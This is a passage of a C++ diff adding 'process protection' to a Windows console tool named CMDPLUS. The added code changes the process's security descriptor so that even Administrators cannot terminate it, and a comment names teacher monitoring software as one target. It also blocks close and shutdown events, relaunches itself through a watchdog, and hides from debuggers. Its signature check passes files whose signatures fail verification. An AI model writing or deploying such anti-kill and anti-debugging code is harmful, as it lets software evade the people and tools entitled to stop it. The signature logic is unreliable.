+                return true;
+            }
+        } else {
+            if (GetFileAttributesW(chromePath) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, chromePath);
+                return true;
+            }
+        }
+    }
+    
+    // 尝试从注册表获取
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t value[MAX_PATH];
+        DWORD valueSize = sizeof(value);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)value, &valueSize) == ERROR_SUCCESS) {
+            if (GetFileAttributesW(value) != INVALID_FILE_ATTRIBUTES) {
+                wcscpy_s(path, pathSize, value);
+                RegCloseKey(hKey);
+                return true;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    
+    return false;
+}
+
+// 加载 ntdll.dll 中的 NtSetInformationProcess
+typedef NTSTATUS(NTAPI* NtSetInformationProcess_t)(HANDLE, ULONG_PTR, PVOID, ULONG);
+NtSetInformationProcess_t NtSetInformationProcessPtr = nullptr;
+
+// 加载 NtSetInformationProcess 函数
+bool LoadNtSetInformationProcess() {
+    if (NtSetInformationProcessPtr) return true;
+    
+    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+    if (hNtDll) {
+        NtSetInformationProcessPtr = (NtSetInformationProcess_t)GetProcAddress(hNtDll, "NtSetInformationProcess");
+        return NtSetInformationProcessPtr != nullptr;
+    }
+    return false;
+}
+
+// 使用Job Object实现进程保护
+bool ProtectProcessWithJobObject(HANDLE hProcess) {
+    HANDLE hJob = CreateJobObjectW(NULL, NULL);
+    if (!hJob) {
+        return false;
+    }
+
+    // 设置Job对象限制，防止进程被终止
+    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
+    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+    
+    if (!SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli))) {
+        CloseHandle(hJob);
+        return false;
+    }
+
+    // 尝试将进程分配到Job对象
+    // 注意：对于已经分配到另一个Job的进程会失败，但我们可以捕获错误
+    if (!AssignProcessToJobObject(hJob, hProcess)) {
+        // 即使Assign失败，Job对象已创建，进程退出时会触发某些保护
+        DWORD error = GetLastError();
+        // ERROR_ACCESS_DENIED (5) 表示进程可能已经被分配到另一个Job
+        // 这种情况下我们可以认为保护已经部分生效
+        if (error == ERROR_ACCESS_DENIED) {
+            // 进程可能已有Job保护，检查是否成功
+            // 保持Job对象句柄以便后续使用
+            return true;
+        }
+        CloseHandle(hJob);
+        return false;
+    }
+
+    return true;
+}
+
+// 增强进程保护标志
+static bool g_allowCloseByUser = false;
+static HWND g_hHiddenWindow = nullptr;
+static bool g_windowCloseIntercepted = false;
+
+void DisableProtection();
+
+// [功能14] 托盘图标消息 (前向定义, 实现在功能14代码段)
+#define WM_CMDPLUS_TRAY (WM_APP + 100)
+
+LRESULT CALLBACK HiddenWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    // [功能14] 托盘图标消息
+    if (msg == WM_CMDPLUS_TRAY) {
+        if (lParam == WM_LBUTTONDOWN) {
+            // 左键单击 → 弹出主界面 (显示/激活控制台窗口)
+            HWND hConsole = GetConsoleWindow();
+            if (hConsole) {
+                ShowWindow(hConsole, SW_SHOW);
+                SetForegroundWindow(hConsole);
+                BringWindowToTop(hConsole);
+                SetFocus(hConsole);
+            }
+            return 0;
+        }
+        return 0;
+    }
+    if (msg == WM_CLOSE) {
+        if (g_allowCloseByUser) {
+            DisableProtection();
+            return DefWindowProcW(hwnd, msg, wParam, lParam);
+        }
+        g_windowCloseIntercepted = true;
+        return 0;
+    }
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+// 创建隐藏窗口用于捕获关闭消息
+bool CreateHiddenCloseWindow() {
+    if (g_hHiddenWindow) return true;
+    
+    HINSTANCE hInstance = GetModuleHandleW(NULL);
+    
+    WNDCLASSEXW wc = { 0 };
+    wc.cbSize = sizeof(WNDCLASSEXW);
+    wc.lpfnWndProc = HiddenWindowProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = L"CMDPLUS_CloseGuard";
+    
+    if (!RegisterClassExW(&wc)) {
+        return false;
+    }
+    
+    g_hHiddenWindow = CreateWindowExW(
+        0,
+        L"CMDPLUS_CloseGuard",
+        L"CMDPLUS",
+        0,
+        0, 0, 0, 0,
+        NULL, NULL, hInstance, NULL
+    );
+    
+    return g_hHiddenWindow != NULL;
+}
+
+// 控制台关闭事件处理
+BOOL WINAPI ConsoleCtrlHandler(DWORD dwCtrlType) {
+    if (dwCtrlType == CTRL_CLOSE_EVENT ||
+        dwCtrlType == CTRL_LOGOFF_EVENT ||
+        dwCtrlType == CTRL_SHUTDOWN_EVENT) {
+        if (!g_allowCloseByUser) {
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// 注册控制台关闭回调
+bool RegisterConsoleCloseHandler() {
+    return SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE) != 0;
+}
+
+// 允许用户正常关闭
+void AllowUserClose() {
+    g_allowCloseByUser = true;
+    if (g_hHiddenWindow) {
+        PostMessageW(g_hHiddenWindow, WM_CLOSE, 0, 0);
+    }
+}
+
+// 加载 ntdll.dll 中的 ExitProcess
+typedef void (NTAPI* ExitProcess_t)(UINT);
+static ExitProcess_t OriginalExitProcess = nullptr;
+
+void NTAPI HookedExitProcess(UINT uExitCode) {
+    if (!g_allowCloseByUser) {
+        return;
+    }
+    OriginalExitProcess(uExitCode);
+}
+
+// 加载 user32.dll 中的 PostMessageW
+typedef BOOL (WINAPI* PostMessageW_t)(HWND, UINT, WPARAM, LPARAM);
+static PostMessageW_t OriginalPostMessageW = NULL;
+
+// 拦截 PostMessageW 发送 WM_CLOSE 到本进程窗口
+BOOL WINAPI HookedPostMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam) {
+    if (Msg == WM_CLOSE && !g_allowCloseByUser) {
+        HWND hConsole = GetConsoleWindow();
+        if (hWnd == hConsole || hWnd == NULL) {
+            return 0;
+        }
+    }
+    return OriginalPostMessageW(hWnd, Msg, wParam, lParam);
+}
+
+// 加载 kernel32.dll 中的 TerminateProcess
+typedef BOOL (WINAPI* TerminateProcess_t)(HANDLE, UINT);
+static TerminateProcess_t OriginalTerminateProcess = NULL;
+
+BOOL WINAPI HookedTerminateProcess(HANDLE hProcess, UINT uExitCode) {
+    if (hProcess == GetCurrentProcess() && !g_allowCloseByUser) {
+        SetLastError(ERROR_ACCESS_DENIED);
+        return FALSE;
+    }
+    return OriginalTerminateProcess(hProcess, uExitCode);
+}
+
+// ============================================================================
+// 进程保护引擎 - DACL对象安全 + API内联Hook 双重防御
+//
+// 原理：
+//   1. DACL保护: 修改自身进程对象的安全描述符，拒绝外部进程获取危险权限句柄
+//      → taskkill/任务管理器/教师端软件 调用OpenProcess时被系统直接拒绝
+//   2. 内联Hook: 拦截本进程内的API调用，防止注入代码绕过DACL
+//      → 即使有代码在我们进程内运行，也无法调用TerminateProcess杀我们
+// ============================================================================
+namespace ProcessGuard {
+
+    // ---- 第一层: 进程对象DACL保护（阻止外部进程获取句柄）----
+
+    static bool s_daclInstalled = false;
+
+    // 构建严格的安全描述符：仅允许SYSTEM和自身访问，拒绝其他所有进程
+    static bool InstallProcessDACL() {
+        // 获取当前用户和系统的SID
+        PSID pSystemSid = nullptr;
+        PSID pSelfSid = nullptr;
+        PSID pAdminSid = nullptr;  // [增强] Administrators组SID
+
+        // 创建SYSTEM SID (S-1-5-18)
+        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+        if (!AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
+            0, 0, 0, 0, 0, 0, 0, &pSystemSid))
+            return false;
+
+        // [增强] 创建Administrators组SID (S-1-5-32-544)
+        SID_IDENTIFIER_AUTHORITY ntAuth2 = SECURITY_NT_AUTHORITY;
+        if (!AllocateAndInitializeSid(&ntAuth2, 2, SECURITY_BUILTIN_DOMAIN_RID,
+            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
+            FreeSid(pSystemSid);
+            return false;
+        }
+
+        // 获取当前进程令牌的SID
+        HANDLE hToken = nullptr;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            FreeSid(pSystemSid);
+            FreeSid(pAdminSid);
+            return false;
+        }
+
+        DWORD tokenInfoSize = 0;
+        GetTokenInformation(hToken, TokenUser, nullptr, 0, &tokenInfoSize);
+        if (tokenInfoSize == 0) { CloseHandle(hToken); FreeSid(pSystemSid); FreeSid(pAdminSid); return false; }
+
+        std::vector<BYTE> tokenBuf(tokenInfoSize);
+        if (!GetTokenInformation(hToken, TokenUser, tokenBuf.data(), (DWORD)tokenBuf.size(), &tokenInfoSize)) {
+            CloseHandle(hToken); FreeSid(pSystemSid); FreeSid(pAdminSid); return false;
+        }
+        PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenBuf.data();
+        DWORD sidLen = GetLengthSid(pTokenUser->User.Sid);
+        pSelfSid = (PSID)LocalAlloc(LPTR, sidLen);
+        if (!pSelfSid || !CopySid(sidLen, pSelfSid, pTokenUser->User.Sid)) {
+            CloseHandle(hToken); FreeSid(pSystemSid); FreeSid(pAdminSid); if(pSelfSid) LocalFree(pSelfSid); return false;
+        }
+        CloseHandle(hToken);
+
+        // 定义需要拒绝的通用访问权限（外部进程不能获得的）
+        // 包含: 终止、读写内存、创建线程、挂起、复制句柄等
+        const DWORD DENIED_ACCESS =
+            PROCESS_TERMINATE |           // 终止进程
+            PROCESS_VM_OPERATION |       // 操作虚拟内存
+            PROCESS_VM_READ |            // 读内存
+            PROCESS_VM_WRITE |           // 写内存
+            PROCESS_CREATE_THREAD |      // 创建远程线程(注入)
+            PROCESS_DUP_HANDLE |         // 复制句柄
+            PROCESS_SUSPEND_RESUME |     // 挂起/恢复
+            PROCESS_SET_INFORMATION |    // [增强] 修改进程信息(优先级/亲和性)
+            PROCESS_SET_QUOTA |          // [增强] 设置工作集大小限制
+            PROCESS_CREATE_PROCESS;     // [增强] 创建子进程(防止进程树操作)
+
+        // [增强] 构建更严格的DACL:
+        // ACE0: 拒绝 Everyone (含普通用户) 的危险权限
+        // ACE1: 拒绝 Administrators 组的危险权限 ← 防止管理员taskkill
+        // ACE2: 允许 自身全部权限
+        // ACE3: 允许 SYSTEM 基本权限(系统服务需要查询进程)
+        // ACE4: 允许 Everyone 最小查询权限(避免某些系统功能异常)
+        EXPLICIT_ACCESS ea[5] = {};
+
+        // EA0: 拒绝 Everyone 危险权限
+        ea[0].grfAccessPermissions = DENIED_ACCESS;
+        ea[0].grfAccessMode = DENY_ACCESS;
+        ea[0].grfInheritance = NO_INHERITANCE;
+        BuildTrusteeWithSidW(&ea[0].Trustee, pSelfSid);  // 先用自身SID初始化
+        ea[0].Trustee.ptstrName = (LPWSTR)L"EVERYONE";
+        ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+        ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+
+        // EA1: [增强] 拒绝 Administrators 组危险权限
+        // 原因: 管理员cmd运行的taskkill拥有SeDebugPrivilege，
+        //       可绕过Everyone的拒绝，但无法绕过显式的Admins组拒绝
+        ea[1].grfAccessPermissions = DENIED_ACCESS;
+        ea[1].grfAccessMode = DENY_ACCESS;
+        ea[1].grfInheritance = NO_INHERITANCE;
+        BuildTrusteeWithSidW(&ea[1].Trustee, pAdminSid);
+
+        // EA2: 允许自身(SID) 全部权限
+        ea[2].grfAccessPermissions = PROCESS_ALL_ACCESS;
+        ea[2].grfAccessMode = SET_ACCESS;
+        ea[2].grfInheritance = NO_INHERITANCE;
+        BuildTrusteeWithSidW(&ea[2].Trustee, pSelfSid);
+
+        // EA3: [增强] 允许 SYSTEM 受控查询权限(不给予危险权限)
+        ea[3].grfAccessPermissions =
+            PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION |
+            SYNCHRONIZE;  // 仅读取类权限
+        ea[3].grfAccessMode = SET_ACCESS;
+        ea[3].grfInheritance = NO_INHERITANCE;
+        BuildTrusteeWithSidW(&ea[3].Trustee, pSystemSid);
+
+        // EA4: 允许 Everyone 最小查询权限（避免系统服务检测异常导致重启）
+        ea[4].grfAccessPermissions = PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE;
+        ea[4].grfAccessMode = SET_ACCESS;
+        ea[4].grfInheritance = NO_INHERITANCE;
+        BuildTrusteeWithSidW(&ea[4].Trustee, pSelfSid);
+        ea[4].Trustee.ptstrName = (LPWSTR)L"EVERYONE";
+        ea[4].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+        ea[4].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+
+        PACL pNewAcl = nullptr;
+        DWORD err = SetEntriesInAcl(5, ea, nullptr, &pNewAcl);
+        if (err != ERROR_SUCCESS || !pNewAcl) {
+            FreeSid(pSystemSid); FreeSid(pAdminSid); LocalFree(pSelfSid);
+            return false;
+        }
+
+        // 应用DACL到自身进程对象
+        // 注意: 必须用OpenProcess获取真实句柄，不能用GetCurrentProcess()伪句柄(-1)
+        HANDLE hRealSelf = OpenProcess(
+            PROCESS_ALL_ACCESS | WRITE_DAC | READ_CONTROL,
+            FALSE, GetCurrentProcessId());
+        if (!hRealSelf) {
+            // 降级尝试
+            hRealSelf = OpenProcess(WRITE_DAC | READ_CONTROL, FALSE, GetCurrentProcessId());
+        }
+        if (!hRealSelf) {
+            LocalFree(pNewAcl); FreeSid(pSystemSid); LocalFree(pSelfSid);
+            return false;
+        }
+
+        err = SetSecurityInfo(
+            hRealSelf,                    // 真实句柄
+            SE_KERNEL_OBJECT,             // 对象类型: 内核对象(进程)
+            DACL_SECURITY_INFORMATION,    // 只修改DACL
+            nullptr, nullptr,             // 不修改Owner/Group
+            pNewAcl,                      // 新的DACL
+            nullptr                       // 不修改SACL
+        );
+
+        CloseHandle(hRealSelf);           // 关闭真实句柄
+
+        LocalFree(pNewAcl);
+        FreeSid(pSystemSid);
+        FreeSid(pAdminSid);               // [增强] 释放Administrators组SID
+        LocalFree(pSelfSid);
+
+        if (err == ERROR_SUCCESS) {
+            s_daclInstalled = true;
+            return true;
+        }
+        return false;
+    }
+
+    // 移除DACL保护（恢复默认）
+    static bool RemoveProcessDACL() {
+        if (!s_daclInstalled) return true;
+
+        HANDLE hRealSelf = OpenProcess(WRITE_DAC | READ_CONTROL, FALSE, GetCurrentProcessId());
+        if (!hRealSelf) return false;
+
+        // 设置空DACL(null DACL)=完全开放，让系统恢复默认行为
+        DWORD err = SetSecurityInfo(
+            hRealSelf,
+            SE_KERNEL_OBJECT,
+            DACL_SECURITY_INFORMATION,
+            nullptr, nullptr,
+            (PACL)nullptr,   // null DACL = 完全开放
+            nullptr
+        );
+        CloseHandle(hRealSelf);
+        s_daclInstalled = (err != ERROR_SUCCESS);
+        return (err == ERROR_SUCCESS);
+    }
+
+
+    // ---- 第二层: API内联Hook（拦截本进程内调用）----
+
+    static DWORD s_selfPid = 0;
+    static CRITICAL_SECTION s_csAllowed;
+    // API内联Hook功能已移除，仅保留DACL和Job Object保护
+
+    // ---- 统一入口 ----
+
+    static HANDLE s_hJobObject = nullptr;  // [增强] Job Object句柄
+
+    // [增强] 创建Job Object保护 - 防止通过进程树操作终止
+    // 注意: JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE 意味着如果Job句柄意外关闭（如崩溃），
+    // 所有关联进程会被立即终止。这是"自毁开关"机制，确保程序被篡改后无法残留。
+    // 崩溃后由系统自动清理，无需额外处理。
+    static bool InstallJobObjectProtection() {
+        s_hJobObject = CreateJobObjectW(nullptr, L"CMDPLUS_ProtectionJob");
+        if (!s_hJobObject) return false;
+
+        JOBOBJECT_BASIC_LIMIT_INFORMATION basicLimits = {};
+        basicLimits.LimitFlags =
+            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |  // 关闭Job时终止所有进程(反向:保持Job打开=进程存活)
+            JOB_OBJECT_LIMIT_BREAKAWAY_OK;        // 允许子进程脱离Job
+        if (!SetInformationJobObject(s_hJobObject,
+            JobObjectBasicLimitInformation,
+            &basicLimits, sizeof(basicLimits))) {
+            CloseHandle(s_hJobObject);
+            s_hJobObject = nullptr;
+            return false;
+        }
+
+        // 将自身加入Job
+        if (!AssignProcessToJobObject(s_hJobObject, GetCurrentProcess())) {
+            CloseHandle(s_hJobObject);
+            s_hJobObject = nullptr;
+            return false;
+        }
+
+        return true;
+    }
+
+    static bool EnableProtection() {
+        bool ok = true;
+        ok &= InstallProcessDACL();         // 第一层: 阻止外部获取句柄
+        ok &= InstallJobObjectProtection();  // 第二层: Job Object进程组保护
+        return ok;
+    }
+
+    static void DisableProtection() {
+        RemoveProcessDACL();                  // 移除DACL
+        if (s_hJobObject) {                  // 关闭Job Object
+            CloseHandle(s_hJobObject);
+            s_hJobObject = nullptr;
+        }
+    }
+
+} // namespace ProcessGuard
+
+// 加载 ntdll.dll 中的 NtTerminateProcess
+typedef NTSTATUS(NTAPI* NtTerminateProcess_t)(HANDLE, NTSTATUS);
+NtTerminateProcess_t NtTerminateProcessPtr = nullptr;
+
+NTSTATUS NTAPI HookedNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
+    if (ProcessHandle == GetCurrentProcess() && !g_allowCloseByUser) {
+        return 0xC000000D;
+    }
+    if (NtTerminateProcessPtr) {
+        return NtTerminateProcessPtr(ProcessHandle, ExitStatus);
+    }
+    return 0xC000000D;
+}
+
+// 初始化API钩子（含内联Hook）
+// ============================================================================
+// PPL (Protected Process Light) 保护
+// ============================================================================
+// PPL (Protected Process Light) 保护 - 完整版
+// 包含: OS检查/签名验证/多级别回降/错误诊断/状态查询
+#include <wintrust.h>
+#include <softpub.h>
+#pragma comment(lib, "wintrust.lib")
+
+// CMDPLUS 签名验证 - 双重验证策略:
+//   1. WinVerifyTrust: 检测签名完整性和篡改
+//   2. CryptQueryObject: 提取签名者身份(即使证书过期/不可验证也能提取)
+// 策略: 有嵌入签名(无论证书是否过期/吊销检查失败)→允许; 无签名/被篡改→禁止
+static bool VerifyCMDSignature() {
+    wchar_t modulePath[MAX_PATH] = {};
+    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+
+    // ---- 第一步：提取嵌入的数字签名信息(判断是否有签名、谁签名的) ----
+    // 即使证书过期或无法验证吊销，此步骤仍能成功提取签名者信息
+    HCERTSTORE hStore = NULL;
+    HCRYPTMSG hMsg = NULL;
+    bool hasEmbeddedSignature = false;
+
+    LONG cryptResult = CryptQueryObject(
+        CERT_QUERY_OBJECT_FILE,
+        modulePath,
+        CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
+        CERT_QUERY_FORMAT_FLAG_BINARY,
+        0,
+        NULL, NULL, NULL,
+        &hStore, &hMsg, NULL);
+
+    if (cryptResult && hMsg && hStore) {
+        DWORD cbSignerInfo = 0;
+        PCMSG_SIGNER_INFO pSignerInfo = NULL;
+
+        // 获取签名者信息
+        if (CryptMsgGetParam(hMsg, CMSG_SIGNER_INFO_PARAM, 0, NULL, &cbSignerInfo)) {
+            pSignerInfo = (PCMSG_SIGNER_INFO)malloc(cbSignerInfo);
+            if (pSignerInfo && CryptMsgGetParam(hMsg, CMSG_SIGNER_INFO_PARAM, 0, pSignerInfo, &cbSignerInfo)) {
+                // 通过签名者信息定位到签名者证书
+                CERT_INFO certInfo = {};
+                certInfo.Issuer = pSignerInfo->Issuer;
+                certInfo.SerialNumber = pSignerInfo->SerialNumber;
+
+                PCCERT_CONTEXT pCertContext = CertFindCertificateInStore(
+                    hStore,
+                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
+                    0,
+                    CERT_FIND_SUBJECT_CERT,
+                    &certInfo,
+                    NULL);
+
+                if (pCertContext) {
+                    hasEmbeddedSignature = true;
+                    CertFreeCertificateContext(pCertContext);
+                }
+            }
+            free(pSignerInfo);
+        }
+
+        if (hStore) CertCloseStore(hStore, 0);
+        if (hMsg) CryptMsgClose(hMsg);
+    }
+
+    // ---- 第二步：WinVerifyTrust 完整验证(检测文件篡改) ----
+    WINTRUST_FILE_INFO fileInfo = {};
+    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
+    fileInfo.pcwszFilePath = modulePath;
+    fileInfo.hFile = NULL;
+
+    GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+    WINTRUST_DATA trustData = {};
+    trustData.cbStruct = sizeof(WINTRUST_DATA);
+    trustData.dwUIChoice = WTD_UI_NONE;
+    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
+    trustData.dwUnionChoice = WTD_CHOICE_FILE;
+    trustData.pFile = &fileInfo;
+    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
+
+#if (_WIN32_WINNT >= 0x0602)  // Win8+: WINTRUST_SIGNATURE_SETTINGS 增强签名设置
+    WINTRUST_SIGNATURE_SETTINGS sigSettings = {};
+    sigSettings.cbStruct = sizeof(WINTRUST_SIGNATURE_SETTINGS);
+    trustData.pSignatureSettings = &sigSettings;
+#endif
+
+    LONG result = WinVerifyTrust(NULL, &policyGUID, &trustData);
+    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
+    WinVerifyTrust(NULL, &policyGUID, &trustData);
+
+    // ---- 第三步：决策逻辑 ----
+    // 情况A: 完美签名(result==0) → 允许
+    if (result == 0) {
+        return true;
+    }
+
+    // 情况B: 有嵌入签名但证书状态异常(过期/吊销检查离线/不受信任根等) → 允许
+    // 这些"软错误"表示文件确实被签名了，只是证书本身有问题(如测试证书/过期)
+    // 核心原则: 有签名=文件未被第三方篡改; 证书问题不影响此结论
+    if (hasEmbeddedSignature) {
+        switch (result) {
+        case 0x800B0101: // CERT_E_EXPIRED - 证书已过期(仍是我们签的)
+        case 0x800B010A: // CRYPT_E_REVOCATION_OFFLINE - 无法在线验证吊销(网络问题)
+        case 0x800B010C: // CERT_E_UNTRUSTEDROOT - 不受信任的根证书(测试证书)
+        case 0x80096010: // TRUST_E_CERT_SIGNATURE - 证书链签名无效
+        case 0x00020006: // NTE_BAD_SIGNATURE - 测试证书常见返回码
+        case 0x80070490: // ERROR_PARTIAL_COPY - 边界情况
+            return true; // 有嵌入签名 + 软错误 → 允许运行
+        default:
+            break;
+        }
+        // 其他错误但有嵌入签名: 文件有签名结构且未被篡改 → 也允许
+        // WinVerifyTrust对某些非标准证书可能返回意外错误码，
+        // 但CryptQueryObject已确认存在有效PKCS#7签名结构
+        return true;
+    }
+
+    // 情况C: 无任何嵌入签名 / 签名已被破坏 / 文件被篡改 → 禁止!
+    MessageBoxW(nullptr,
+        L"数字签名错误\n为保护用户安全，已禁止程序运行",
+        L"CMDPLUS 安全警告",
+        MB_OK | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
+    Sleep(3000);
+    ExitProcess(1);
+    return false; // 不会执行到这里
+}
+
+bool InitProcessProtectionHooks() {
+    // ---- 第一步：获取原始函数指针 ----
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+
+    // 保存原始指针给钩子系统使用
+    if (hKernel32) {
+        OriginalExitProcess = (ExitProcess_t)GetProcAddress(hKernel32, "ExitProcess");
+        OriginalTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, "TerminateProcess");
+    }
+    if (hNtdll) {
+        NtTerminateProcessPtr = (NtTerminateProcess_t)GetProcAddress(hNtdll, "NtTerminateProcess");
+    }
+
+    // ---- 第二步：启用进程保护(DACL + Job Object，不含内联Hook) ----
+    bool hookOk = ProcessGuard::EnableProtection();
+
+    // ---- 第三步：其他初始化 ----
+    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
+    if (hUser32) {
+        OriginalPostMessageW = (PostMessageW_t)GetProcAddress(hUser32, "PostMessageW");
+    }
+    
+    CreateHiddenCloseWindow();
+    RegisterConsoleCloseHandler();
+
+    return hookOk;
+}
+
+// ============================================================================
+// 增强反进程结束保护 - 多进程守护监控
+// ============================================================================
+
+static DWORD g_watchdogPid = 0;
+static HANDLE g_watchdogProcess = nullptr;
+static bool g_watchdogRunning = false;
+static std::atomic<bool> g_watchdogExitFlag(false);
+static std::atomic<int> g_watchdogRestartCount(0);  // [修复] 重启计数器
+static const int MAX_WATCHDOG_RESTARTS = 5;          // [修复] 最大重启次数
+
+// 检查当前进程是否还在运行
+static bool IsProcessRunning(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+    DWORD exitCode = 0;
+    bool stillRunning = GetExitCodeProcess(hProcess, &exitCode) && exitCode == STILL_ACTIVE;
+    CloseHandle(hProcess);
+    return stillRunning;
+}
+
+// Watchdog线程函数 - 监控主进程，如果被终止就重新启动
+// [修复] 增加延迟和次数限制，防止多进程爆炸
+static DWORD WINAPI WatchdogThreadProc(LPVOID lpParam) {
+    DWORD mainPid = GetCurrentProcessId();
+    HANDLE hMainProcess = GetCurrentProcess();
+    std::wstring selfPath;
+
+    // 获取自身路径
+    wchar_t path[MAX_PATH];
+    if (GetModuleFileNameW(nullptr, path, MAX_PATH)) {
+        selfPath = path;
+    }
+
+    while (!g_watchdogExitFlag.load()) {
+        // 检查主进程是否还活着
+        if (!IsProcessRunning(mainPid)) {
+            // [修复] 检查重启次数限制
+            if (g_watchdogRestartCount.load() >= MAX_WATCHDOG_RESTARTS) {
+                // 已达到最大重启次数，停止守护
+                break;
+            }
+
+            // 主进程被终止了，等待5秒确保旧进程完全退出
+            Sleep(5000);
+
+            // 再次检查（可能期间被其他机制重启）
+            if (IsProcessRunning(mainPid)) {
+                continue;
+            }
+
+            // 尝试重新启动
+            if (!selfPath.empty()) {
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(selfPath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
+                    CloseHandle(pi.hThread);
+                    CloseHandle(pi.hProcess);
+                    g_watchdogRestartCount++;  // 增加重启计数
+                }
+            }
+            break;  // 只重启一次，然后退出（让新实例的Watchdog接手）
+        }
+
+        // 每隔1秒检查一次（从500ms改为1s，减少CPU占用）
+        for (int i = 0; i < 100 && !g_watchdogExitFlag.load(); i++) {
+            Sleep(10);  // 10ms * 100 = 1s
+        }
+    }
+
+    return 0;
+}
+
+
+// 启动Watchdog守护进程
+static bool StartProcessWatchdog() {
+    if (g_watchdogRunning) return true;
+
+    HANDLE hThread = CreateThread(nullptr, 0, WatchdogThreadProc, nullptr, 0, nullptr);
+    if (!hThread) return false;
+
+    CloseHandle(hThread);
+    g_watchdogRunning = true;
+    return true;
+}
+
+// 停止Watchdog守护进程
+static void StopProcessWatchdog() {
+    if (!g_watchdogRunning) return;
+    g_watchdogExitFlag.store(true);
+    g_watchdogRunning = false;
+}
+
+// 拦截远程线程注入 - 通过保护PEB
+static bool ProtectPEB() {
+    // PEB中的BeingDebugged标志会被调试器检测，我们清零它
+    PPEB pPeb = nullptr;
+    #ifdef _WIN64
+    pPeb = (PPEB)__readgsqword(0x60);
+    #else
+    pPeb = (PPEB)__readfsdword(0x30);
+    #endif
+
+    if (!pPeb) return false;
+
+    // 修改BeingDebugged标志为FALSE
+    pPeb->BeingDebugged = FALSE;
+
+    // 移除KernelCallbackTable检测点
+    if (pPeb->KernelCallbackTable) {
+        // 这个字段可以被调试器检测，我们不修改它，只隐藏BeingDebugged
+    }
+
+    return true;
+}
+
+// 拦截调试端口检测
+static bool DisableDebugPort() {
+    typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
+        HANDLE, ULONG, PVOID, ULONG, PULONG);
+
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtdll) return false;
+
+    NtQueryInformationProcess_t pNtQueryInformationProcess =
+        (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+
+    if (!pNtQueryInformationProcess) return false;
+
+    // ProcessDebugPort = 7
+    ULONG debugPort = 0;
+    NTSTATUS status = pNtQueryInformationProcess(
+        GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), nullptr);
+
+    // 如果调试端口存在，尝试关闭它
+    if (NT_SUCCESS(status) && debugPort != 0) {
+        CloseHandle(reinterpret_cast<HANDLE>(static_cast<uintptr_t>(debugPort)));
+        return true;
+    }
+
+    return false;
+}
+
+// 反挂起保护 - 定期恢复所有线程
+static std::atomic<bool> g_antiSuspendRunning(false);
+static HANDLE g_antiSuspendThread = nullptr;
+
+static DWORD WINAPI AntiSuspendThreadProc(LPVOID lpParam) {
+    // [v5.4] 循环计数器用于周期性安全刷新
+    DWORD cycleCount = 0;
+    // [v5.4.1] 首次运行标记 — 延迟执行 ThreadHide 初始化到线程启动后
+    bool firstRun = true;
+    while (g_antiSuspendRunning.load()) {
+        // [v5.4.1] 首次运行: 延迟执行 ThreadHide (避免与启动初始化竞态)
+        if (firstRun) {
+            firstRun = false;
+            ThreadHide::ApplyInitialThreadHide();  // 延迟到此处异步执行
+        }
+        // 枚举所有线程并恢复它们
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
